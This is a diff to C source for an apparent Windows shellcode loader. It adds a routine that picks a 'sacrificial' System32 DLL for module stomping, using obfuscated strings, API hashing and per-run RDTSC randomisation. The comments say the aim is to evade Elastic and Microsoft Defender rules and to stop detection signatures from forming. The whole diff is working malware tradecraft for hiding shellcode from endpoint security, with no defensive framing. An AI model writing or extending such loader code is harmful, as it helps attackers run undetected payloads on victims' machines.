@@ -18,6 +18,104 @@
 #include "Common.h"
 
 // -----------------------------------------------
+// Sacrificial DLL allowlist picker.
+//
+// Replaces the previous "scan all of System32 for any large-enough DLL" logic
+// with a fixed 4-entry allowlist of low-sensitivity DLLs (multimedia / debug /
+// printing). Reasons:
+//
+//   1. Determinism: known-good targets, no chance of picking up a Defender-
+//      reputation-flagged module (e.g. crypto, authentication, AAD helpers).
+//   2. Avoids Elastic / MDE rules that pin known stomp targets (msftedit.dll,
+//      wwanmm.dll, winhttp.dll, aadauthhelper.dll, amd_comgr.dll).
+//   3. Per-run rotation via RDTSC, so static "loader uses X.dll" signatures
+//      can't form across multiple samples.
+//
+// For each candidate (in randomized order):
+//   - File present in System32 ?
+//   - Executable section large enough for shellcode ?
+//   - Not already loaded in this process (Phantom only — ModuleStomp loads it
+//     itself; pass IsForLoad=TRUE to skip this check)
+// First match wins.
+// -----------------------------------------------
+BOOL PickSacrificialDll(
+    IN  PAPI_HASHING pApi,
+    IN  DWORD        dwMinSize,
+    OUT PCHAR        pOutName,
+    OUT PCHAR        pOutFullPath
+) {
+    if (!pApi || !pOutName) return FALSE;
+
+    // Deobfuscate the 4 candidate filenames.
+    BYTE xDll1[] = XSTR_STOMP_DLL_1; DEOBF(xDll1);
+    BYTE xDll2[] = XSTR_STOMP_DLL_2; DEOBF(xDll2);
+    BYTE xDll3[] = XSTR_STOMP_DLL_3; DEOBF(xDll3);
+    BYTE xDll4[] = XSTR_STOMP_DLL_4; DEOBF(xDll4);
+    LPCSTR candidates[4] = { (LPCSTR)xDll1, (LPCSTR)xDll2, (LPCSTR)xDll3, (LPCSTR)xDll4 };
+
+    // RDTSC-seeded Fisher-Yates of indices [0..3].
+    ULONGLONG tsc = __rdtsc();
+    BYTE order[4] = { 0, 1, 2, 3 };
+    for (int i = 3; i > 0; i--) {
+        int j = (int)((tsc >> (i * 7)) & 0xFF) % (i + 1);
+        BYTE t = order[i]; order[i] = order[j]; order[j] = t;
+    }
+
+    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
+    DEOBF(xPrefix);
+    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);
+
+    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
+    DEOBF(xCreateFile);
+    BYTE xK32[] = XSTR_KERNEL32_DLL;
+    DEOBF(xK32);
+    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
+    if (!hK32) return FALSE;
+    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);
+    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
+    fnCloseHandle2 pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
+    if (!pCreateFile || !pReadFile || !pCloseHandle) return FALSE;
+
+    for (int idx = 0; idx < 4; idx++) {
+        LPCSTR name = candidates[order[idx]];
+        SIZE_T nName = StrLenA(name);
+
+        CHAR szFull[260];
+        MemSet(szFull, 0, sizeof(szFull));
+        MemCopy(szFull, xPrefix, nPre);
+        MemCopy(szFull + nPre, name, nName);
+
+        HANDLE hFile = pCreateFile(szFull, GENERIC_READ, FILE_SHARE_READ,
+                                   NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) continue;
+
+        BYTE peHdr[1024];
+        DWORD dwRead = 0;
+        BOOL ok = pReadFile(hFile, peHdr, sizeof(peHdr), &dwRead, NULL);
+        pCloseHandle(hFile);
+        if (!ok) continue;
+
+        PIMAGE_NT_HEADERS pNt = NULL;
+        if (!ValidatePeHeadersBounded(peHdr, dwRead, &pNt)) continue;
+
+        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+        BOOL fits = FALSE;
+        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
+            if ((pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                pSec[s].SizeOfRawData >= dwMinSize) {
+                fits = TRUE; break;
+            }
+        }
+        if (!fits) continue;
+
+        MemCopy(pOutName, name, nName + 1);
+        if (pOutFullPath) MemCopy(pOutFullPath, szFull, nPre + nName + 1);
+        return TRUE;
+    }
+    return FALSE;
+}
+
+// -----------------------------------------------
 // Build a synthetic call stack (Draugr MVP).
 //
 // Allocates a 1 MB private buffer and writes three fake return
@@ -113,15 +211,18 @@ BOOL ModuleStomp(
     if (!pApi || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
         return FALSE;
 
-    // Load sacrificial DLL (deobfuscated)
-    BYTE xDll[] = XSTR_STOMP_DLL;
-    DEOBF(xDll);
-    HMODULE hModule = pApi->pLoadLibraryA((LPCSTR)xDll);
+    // Pick a sacrificial DLL from the per-build allowlist (random order).
+    CHAR szPickName[260] = { 0 };
+    if (!PickSacrificialDll(pApi, dwShellcodeSize, szPickName, NULL)) {
+        LOG("[!] Module stomp: no allowlisted DLL fits shellcode");
+        return FALSE;
+    }
+    HMODULE hModule = pApi->pLoadLibraryA(szPickName);
     if (!hModule) {
         LOG("[!] Module stomp: LoadLibrary failed");
         return FALSE;
     }
-    LOG("[+] Module stomp: sacrificial DLL loaded");
+    LOG("[+] Module stomp: sacrificial DLL loaded (from allowlist)");
 
     // Parse PE headers to find executable section
     PIMAGE_NT_HEADERS pNt = NULL;
